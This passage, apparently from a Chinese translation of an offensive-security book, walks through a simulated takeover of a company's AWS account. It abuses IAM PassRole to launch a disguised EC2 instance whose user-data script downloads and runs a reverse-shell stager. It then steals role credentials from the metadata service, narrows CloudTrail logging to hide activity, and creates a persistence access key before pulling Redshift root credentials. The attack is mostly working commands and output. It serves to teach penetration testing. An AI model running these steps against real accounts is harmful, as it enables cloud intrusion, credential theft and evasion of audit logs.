
```
"Resource": "*"
--snip--
```

GP 可能并未完全意识到这一点，但通过 IAM PassRole 操作，他们已隐式地将亲爱的 Camellia——以及由此延伸的我们——对他们 AWS 账户的完全控制权授予了。PassRole 是一种强大的权限，允许我们将角色分配给实例。任何角色 ①。甚至是管理员角色。有了 EC2 完全访问权限，Camellia 还可以管理 EC2 实例并启动机器，为其分配管理员角色，从而接管 AWS 账户。

> NOTE
与 MXR Ads 不同，GP 甚至没有费心限制对发起调用的用户进行 IAM 只读调用——这是许多公司常见的疏忽，它们默认向用户分配 IAM list* 和 get* 权限。

让我们探索一下作为 Camellia，我们可以传递给 EC2 实例的角色有哪些选项。唯一的限制是该角色需要在其信任策略中包含 ec2.amazonaws.com：

```
root@Point1:~/# aws iam list-roles --profile camellia \
| jq -r '.Roles[] | .RoleName + ", " + \
.AssumeRolePolicyDocument.Statement[].Principal.Service' \
| grep "ec2.amazonaws.com"
--snip--
jenkins-cicd, ec2.amazonaws.com
jenkins-jobs, ec2.amazonaws.com
rundeck, ec2.amazonaws.com
spark-master, ec2.amazonaws.com
```

在我们看到的角色中，有 rundeck，这可能正是我们承诺的救世主。Rundeck 是一个用于在基础设施上运行管理员脚本的自动化工具。GP 的基础设施团队似乎不太热衷于使用 Jenkins，因此他们可能将大部分工作负载安排在了 Rundeck 上。让我们使用 Camellia 来查看 rundeck 具有哪些权限：

```
root@Point1:~/# aws iam get-attached-role-policies \
--role-name rundeck \
--profile camellia

"PolicyName": "rundeck-mono-policy",

# get policy version
root@Point1:~/# aws iam get-policy --profile camellia \
--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy

"DefaultVersionId": "v13",

# get policy content
root@Point1:~/# aws iam get-policy-version \
--version v13 \
--profile camellia \
--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy

"Action":["ec2:*", "ecr:*", "iam:*", "rds:*", "redshift:*",...]
"Resource": "*"
--snip--
```

是的，这就是我们需要的角色。rundeck 角色在 AWS 上拥有接近完全的管理员权限。

因此，计划是在与 Spark 集群相同的子网中启动一个实例。我们仔细复制相同的属性以隐藏在众目睽睽之下：安全组、标签，一切。我们正在查找这些属性，以便日后可以模仿它们：

```
root@Point1:~/# aws ec2 describe-instances --profile camellia \
--filters 'Name=tag:Name,Values=*spark*'

--snip--
"Tags":
    Key: Name  Value: spark-master-streaming
"ImageId": "ami-02df9ea15c1778c9c",
"InstanceType": "m5.xlarge",
"SubnetId": "subnet-00580e48",
"SecurityGroups":
    GroupName: spark-master-all, GroupId: sg-06a91d40a5d42fe04
    GroupName: spark-worker-all, GroupId: sg-00de21bc7c864cd25
--snip--
```

我们确切知道 Spark 工作节点可以通过 443 端口访问互联网，因此我们只是懒惰地复制并粘贴刚刚确认的安全组，并使用这些属性以 rundeck 配置文件启动一个新实例：

```
root@Point1:~/# aws ec2 run-instances \
--image-id ami-02df9ea15c1778c9c \
--count 1 \
--instance-type m3.medium \
--iam-instance-profile rundeck \
--subnet-id subnet-00580e48 \
--security-group-ids sg-06a91d40a5d42fe04 \
--tag-specifications 'ResourceType=instance,Tags= [{Key=Name,Value=spark-worker-5739ecea19a4}]' \
--user-data file://my_user_data.sh \
--profile camellia \
--region eu-west-1
```

作为用户数据传递的脚本 (my_user_data.sh) 将引导我们的反向 shell：

```
#!/bin/bash
wget https://gretsch-spark-eu.s3.amazonaws.com/stager
chmod +x ./stager
./stager&
```

我们运行上述 AWS 命令，果然，一两分钟后我们获得了我们希望的最后一个 shell，并附带管理员权限：

```
[*] https://0.0.0.0:443 handling request from...
[*] https://0.0.0.0:443 handling request from...
msf exploit(multi/handler) > sessions -i 9
[*] Starting interaction with 9...
meterpreter > execute -i -H -f curl -a \
http://169.254.169.254/latest/meta-data/iam/security-credentials/rundeck

"AccessKeyId" : "ASIA44ZRK6WS36YMZOCQ",
"SecretAccessKey" : "rX80A+2zCNaXqHrl2awNOCyJpIwu2FQroHFyfnGn",
"Token" : "IQ0Jb3jPZ1uXv2XjEj/////////////wEaCNV1LXdc1c3QtMSJ...
```

太棒了！我们获得了属于 rundeck 角色的一大堆顶级安全级别的密钥和令牌。现在我们有了这些密钥，让我们查询可能暴露的经典服务，以查看哪些处于活跃状态（CloudTrail、GuardDuty 和 Access Analyzer）：

```
root@Point1:~/# export AWS_PROFILE=rundeck
root@Point1:~/# export AWS_REGION=eu-west-1
root@Point1:~/# aws cloudtrail describe-trails

    "Name": "aggregated",
    "S3BucketName": "gretsch-aggreg-logs",
    "IncludeGlobalServiceEvents": true,
    "IsMultiRegionTrail": true,
    "HomeRegion": "eu-west-1",
    ⓘ "HasInsightSelectors": false,

root@Point1:~/# aws guardduty list-detectors
"DetectorIds": []

root@Point1:~/# aws accessanalyzer list-analyzers
"analyzers": []
```

好的。CloudTrail 如预期已启用，因此日志可能成为问题。那里没有太大惊喜。不过 Insights 已禁用 ⓘ，因此如果需要，我们可以承受一些批量写入 API 调用。GuardDuty 和 Access Analyzer 返回空列表，因此两者也都不在组合中。

让我们暂时遮蔽日志轨迹，并在 Camellia 的用户账户中插入一个访问密钥以提高我们的持久性。如果我们想重新获得对 GP 账户的访问权限，她的权限已经足够：

```
root@Point1:~/# aws cloudtrail update-trail \
--name aggregated \
--no-include-global-service-events \
--no-is-multi-region

root@Point1:~/# aws iam list-access-keys --user-name camellia
"AccessKeyId": "AKIA4ZRK6WSXNQGVUX7",
"Status": "Active",
"CreateDate": "2019-12-13T18:26:17Z"

root@Point1:~/# aws iam create-access-key --user-name camellia
{
  "AccessKey": {
    "UserName": "camellia",
    "AccessKeyId": "AKIA4ZRK6WSS2RB4CUX",
    "SecretAccessKey": "10k//uyLSPoc6VkveOMFdpZFf5wWvsTwX/fLT7Ch",
    "CreateDate": "2019-12-21T18:20:04Z"
  }
}
```

三十分钟后，我们清理 EC2 实例并重新启用 CloudTrail 多区域日志记录：

```
root@Point1:~/# aws cloudtrail update-trail \
--name aggregated \
--include-global-service-events \
--is-multi-region
```

最后！我们获得了对 GP AWS 账户的稳定管理员访问权限。

## 渗透 Redshift

现在我们已经获得了对 GP AWS 账户的访问权限，让我们四处查看其 Redshift 集群（参见列表 12-10）。毕竟，这正是我们接管该账户的主要动机。

```
root@Point1:~/# aws redshift describe-clusters
"Clusters": [
ClusterIdentifier: bi,
  NodeType: ra3.16xlarge, NumberOfNodes: 10,
  "DBName": "datalake"
--snip--

ClusterIdentifier: sandbox
  NodeType: dc2.large,  NumberOfNodes: 2,
  "DBName": "datalake"
--snip--

ClusterIdentifier: reporting
  NodeType: dc2.8xlarge, NumberOfNodes: 16,
  "DBName": "datalake"
--snip--

ClusterIdentifier: finance, NodeType: dc2.8xlarge
  NumberOfNodes: 24,
  "DBName": "datalake"
--snip--
```

列表 12-10：列出 Redshift 集群

我们获得了在 Redshift 上运行的一堆集群，其中包含有价值的信息。Redshift 是一个不错的猜测。你不会仅仅为了好玩就创建一个支持每个节点 2.5TB 的 ra3.16xlarge 集群 ①。那东西每天的费用很容易超过 3000 美元，这使得探索它更具诱惑力。finance 集群也可能包含一些有趣的数据。

让我们放大列表 12-10 中 bi 集群的信息。当集群启动时创建的初始数据库称为 datalake。管理员用户是传统的 root 用户。集群可通过地址 bi.cae0svj50m2p.eu-west-1.redshift.amazonaws.com 在 5439 端口访问：

```
Clusters: [
ClusterIdentifier: sandbox-test,
NodeType: ra3.16xlarge,
MasterUsername: root
DBName: datalake,
Endpoint: {
  Address: bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com,
  Port: 5439
}
VpcSecurityGroupId: sg-9f3a64e4, sg-a53f61de, sg-042c4a3f80a7e262c
--snip--
```

我们查看安全组，看看是否有可能阻止直接连接到数据库的过滤规则：

```
root@Point1:~/# aws ec2 describe-security-groups \
--group-ids sg-9f3a64e4 sg-a53f61de

"IpPermissions": [ {
  "ToPort": 5439,
  "IpProtocol": "tcp",
  "IpRanges": [
    { "CidrIp": "52.210.98.176/32" },
    { "CidrIp": "32.29.54.20/32" },
    { "CidrIp": "10.0.0.0/8" },
    { "CidrIp": "0.0.0.0/0" },
```

我有史以来最喜欢的 IP 范围：0.0.0.0/0。这个未过滤的 IP 范围可能只是作为临时访问授予，用于测试新的 SaaS 集成或运行一些查询……然而我们就在这里。公平地说，由于我们已经可以访问 GP 的网络，这对我们来说意义不大。损害已经造成。

Redshift 与 IAM 服务紧密耦合，因此我们不需要去寻找数据库的凭证。由于我们的 rundeck 角色附带了一个漂亮的 redshift:* 权限，我们只需为数据库上的任何用户账户（包括 root）创建一个临时密码：

```
root@Point1:~/# aws redshift get-cluster-credentials \
--db-user root \
--db-name datalake\
--cluster-identifier bi \
--duration-seconds 3600
```
